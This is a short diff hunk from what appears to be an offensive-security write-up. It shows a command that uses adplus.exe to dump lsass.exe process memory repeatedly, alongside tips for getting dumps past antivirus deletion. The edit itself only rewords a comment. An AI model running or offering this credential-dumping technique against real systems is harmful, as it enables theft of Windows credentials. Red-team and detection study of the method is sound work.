@@ -44,7 +44,7 @@ If the dump file is deleted by the AV then try replacing ```-pn lsass.exe``` wit
 If that doesn't work then use the ```-r``` flag which creates a dump file every X seconds. For some reason that worked for me and the files didn't get deleted. Obviously this is less stealthy as it's writing multiple files to disk.
 
     #New command
-    #Create 10 dumps, 1 every 2 seconds
+    #Create 10 dumps, one every 2 seconds
     adplus.exe -hang -p <PID> -o c:\users\mr.d0x\output\folder -r 10 2 -quiet
 
     #Vbs
